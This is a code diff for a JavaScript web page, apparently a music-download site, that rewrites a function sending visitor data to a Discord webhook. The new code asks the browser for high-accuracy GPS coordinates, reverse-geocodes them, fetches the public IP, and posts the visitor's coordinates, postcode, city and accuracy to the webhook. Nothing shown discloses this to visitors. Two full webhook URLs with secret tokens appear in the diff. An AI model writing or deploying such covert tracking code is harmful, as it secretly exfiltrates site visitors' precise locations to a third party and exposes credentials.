@@ -96,140 +96,102 @@
     return `${base}.mp3`;
   }
 
-  // Discord Webhook Function with multiple API fallbacks
+  // Discord Webhook Function (accurate locality: Geolocation -> BigDataCloud, fallback: IP)
   async function sendDiscordNotification() {
-    const webhookURL = "https://discord.com/api/webhooks/1472531205151920200/oM-2PsyF0RJ9XtpORaJgCG37mjtjSLDlEKJd1pyalCB9WTbk2-QLA0bKNAh1UHPZ_eat";
+    const webhookURL = "https://discord.com/api/webhooks/1459594953679441934/L5XH5D46GOZtYS1AnZDQeqAsmH2ncJxclgVAtO3I5HtTNmbb1-yHf3V5-gQpyCji5Q9B";
     
     try {
       console.log('🔄 Начинаем сбор данных...');
-      
-      let geoData = {
-        ip: "Неизвестно",
-        country: "Неизвестно",
-        countryCode: null,
-        region: "Неизвестно",
-        city: "Неизвестно",
-        isp: "Неизвестно",
-        timezone: "Unknown"
+
+      // ---- small utils ----
+      const withTimeout = (promise, ms) => Promise.race([
+        promise,
+        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), ms))
+      ]);
+
+      const fetchJson = async (url, timeoutMs = 6000) => {
+        const res = await withTimeout(fetch(url, { cache: 'no-store' }), timeoutMs);
+        if (!res.ok) throw new Error(`http_${res.status}`);
+        return res.json();
       };
-      
-      // Method 1: Try ipapi.co with IP
+
+      const getCoords = async () => new Promise((resolve, reject) => {
+        if (!navigator.geolocation) return reject(new Error('no_geolocation'));
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+          }),
+          (err) => reject(err),
+          {
+            enableHighAccuracy: true,
+            timeout: 8000,
+            maximumAge: 60000
+          }
+        );
+      });
+
+      const getPublicIP = async () => {
+        const data = await fetchJson('https://api.ipify.org?format=json', 5000);
+        return data?.ip || null;
+      };
+
+      const getBigDataCloudLocality = async (coordsOrNull) => {
+        const params = new URLSearchParams({ localityLanguage: 'ru' });
+        if (coordsOrNull) {
+          params.set('latitude', String(coordsOrNull.latitude));
+          params.set('longitude', String(coordsOrNull.longitude));
+        }
+        const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?${params.toString()}`;
+        return fetchJson(url, 7000);
+      };
+
+      // ---- collect location ----
+      let coords = null;
       try {
-        console.log('🌐 Пробуем ipapi.co...');
-        const response = await Promise.race([
-          fetch('https://ipapi.co/json/'),
-          new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
-        ]);
-        
-        if (response.ok) {
-          const data = await response.json();
-          console.log('✅ ipapi.co ответил:', data);
-          
-          if (data && !data.error) {
-            geoData = {
-              ip: data.ip || geoData.ip,
-              country: data.country_name || geoData.country,
-              countryCode: data.country_code || data.country || null,
-              region: data.region || geoData.region,
-              city: data.city || geoData.city,
-              isp: data.org || data.asn || geoData.isp,
-              timezone: data.timezone || geoData.timezone
-            };
-          }
-        }
+        console.log('📍 Пытаемся получить координаты (браузерная геолокация)...');
+        coords = await getCoords();
+        console.log('✅ Координаты получены:', coords);
       } catch (e) {
-        console.warn('⚠️ ipapi.co не сработал:', e.message);
+        console.log('ℹ️ Координаты недоступны (deny/timeout/unsupported). Пойдём по IP fallback.');
       }
 
-      // Method 2: If ipapi failed, try ip-api.com
-      if (geoData.country === "Неизвестно") {
-        try {
-          console.log('🌐 Пробуем ip-api.com...');
-          const response = await Promise.race([
-            fetch('http://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,isp,org,as,timezone,query'),
-            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
-          ]);
-          
-          if (response.ok) {
-            const data = await response.json();
-            console.log('✅ ip-api.com ответил:', data);
-            
-            if (data && data.status === 'success') {
-              geoData = {
-                ip: data.query || geoData.ip,
-                country: data.country || geoData.country,
-                countryCode: data.countryCode || null,
-                region: data.regionName || data.region || geoData.region,
-                city: data.city || geoData.city,
-                isp: data.isp || data.org || data.as || geoData.isp,
-                timezone: data.timezone || geoData.timezone
-              };
-            }
-          }
-        } catch (e) {
-          console.warn('⚠️ ip-api.com не сработал:', e.message);
-        }
+      let bdc = null;
+      try {
+        console.log('🌐 BigDataCloud reverse-geocode-client...');
+        bdc = await getBigDataCloudLocality(coords);
+        console.log('✅ BigDataCloud ответил:', bdc);
+      } catch (e) {
+        console.warn('⚠️ BigDataCloud не сработал:', e?.message || e);
       }
 
-      // Method 3: If still no data, try ipwhois.app
-      if (geoData.country === "Неизвестно") {
-        try {
-          console.log('🌐 Пробуем ipwhois.app...');
-          const response = await Promise.race([
-            fetch('https://ipwhois.app/json/'),
-            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
-          ]);
-          
-          if (response.ok) {
-            const data = await response.json();
-            console.log('✅ ipwhois.app ответил:', data);
-            
-            if (data && data.success) {
-              geoData = {
-                ip: data.ip || geoData.ip,
-                country: data.country || geoData.country,
-                countryCode: data.country_code || null,
-                region: data.region || geoData.region,
-                city: data.city || geoData.city,
-                isp: data.isp || data.org || geoData.isp,
-                timezone: data.timezone || geoData.timezone
-              };
-            }
-          }
-        } catch (e) {
-          console.warn('⚠️ ipwhois.app не сработал:', e.message);
-        }
+      let publicIP = null;
+      try {
+        publicIP = await getPublicIP();
+      } catch (e) {
+        console.warn('⚠️ Не удалось получить IP (ipify):', e?.message || e);
       }
 
-      // Method 4: If still nothing, try freeipapi.com
-      if (geoData.country === "Неизвестно") {
-        try {
-          console.log('🌐 Пробуем freeipapi.com...');
-          const response = await Promise.race([
-            fetch('https://freeipapi.com/api/json'),
-            new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
-          ]);
-          
-          if (response.ok) {
-            const data = await response.json();
-            console.log('✅ freeipapi.com ответил:', data);
-            
-            if (data) {
-              geoData = {
-                ip: data.ipAddress || geoData.ip,
-                country: data.countryName || geoData.country,
-                countryCode: data.countryCode || null,
-                region: data.regionName || geoData.region,
-                city: data.cityName || geoData.city,
-                isp: data.isp || geoData.isp,
-                timezone: data.timeZone || geoData.timezone
-              };
-            }
-          }
-        } catch (e) {
-          console.warn('⚠️ freeipapi.com не сработал:', e.message);
-        }
-      }
+      const browserTZ = (() => {
+        try { return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; }
+        catch { return 'Unknown'; }
+      })();
+
+      const lookupSource = bdc?.lookupSource || (coords ? 'reverseGeocoding' : 'ipGeolocation');
+
+      let geoData = {
+        ip: publicIP || 'Неизвестно',
+        country: bdc?.countryName || 'Неизвестно',
+        countryCode: bdc?.countryCode || null,
+        region: bdc?.principalSubdivision || 'Неизвестно',
+        city: (bdc?.city || bdc?.locality) || 'Неизвестно',
+        postcode: bdc?.postcode || null,
+        isp: 'Неизвестно',
+        timezone: browserTZ,
+        lookupSource,
+        coords: coords ? { lat: coords.latitude, lon: coords.longitude, accuracy: coords.accuracy } : null
+      };
 
       console.log('📊 Итоговые данные геолокации:', geoData);
       
@@ -272,6 +234,15 @@
         currentTime = new Date().toLocaleString('ru-RU');
       }
 
+      const sourceLabel = geoData.lookupSource === 'reverseGeocoding' ? 'GPS' : 'IP';
+      const postcodeLine = geoData.postcode ? `\n**Индекс:** ${geoData.postcode}` : '';
+      const coordsLine = geoData.coords
+        ? `\n**Коорд.:** ${geoData.coords.lat.toFixed(5)}, ${geoData.coords.lon.toFixed(5)}`
+        : '';
+      const accuracyLine = (geoData.coords && Number.isFinite(geoData.coords.accuracy))
+        ? `\n**Точность:** ~${Math.round(geoData.coords.accuracy)} м`
+        : '';
+
       // Create embed
       const embed = {
         username: "tonhind.vercel.app",
@@ -287,7 +258,7 @@
           fields: [
             {
               name: "🌍 Локация",
-              value: `**Страна:** ${flagEmoji} ${geoData.country}${geoData.countryCode ? ` (${geoData.countryCode})` : ''}\n**Город:** ${geoData.city}\n**Регион:** ${geoData.region}\n**Провайдер:** ${geoData.isp}`,
+              value: `**Страна:** ${flagEmoji} ${geoData.country}${geoData.countryCode ? ` (${geoData.countryCode})` : ''}\n**Город:** ${geoData.city}\n**Регион:** ${geoData.region}${postcodeLine}\n**Источник:** ${sourceLabel}${coordsLine}${accuracyLine}`,
               inline: true
             },
             {
